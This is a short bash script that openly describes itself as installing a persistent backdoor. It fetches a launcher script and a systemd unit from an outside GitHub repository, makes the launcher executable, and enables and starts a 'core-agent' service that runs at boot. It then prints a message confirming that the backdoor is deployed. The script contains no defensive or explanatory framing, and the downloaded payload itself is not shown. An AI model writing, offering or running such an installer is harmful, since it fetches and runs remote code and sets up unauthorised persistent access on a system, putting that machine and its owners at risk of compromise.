#!/bin/bash

# Download and set up the persistent backdoor launcher script
curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/core-launch.sh -o /usr/local/bin/core-launch.sh
chmod +x /usr/local/bin/core-launch.sh

# Download and install the systemd service file for persistence
curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/core-agent.service -o /etc/systemd/system/core-agent.service

# Reload systemd, enable the service to run on boot, and start it now
systemctl daemon-reload
systemctl enable core-agent
systemctl start core-agent

echo "[+] Backdoor deployed and running as system service: core-agent"
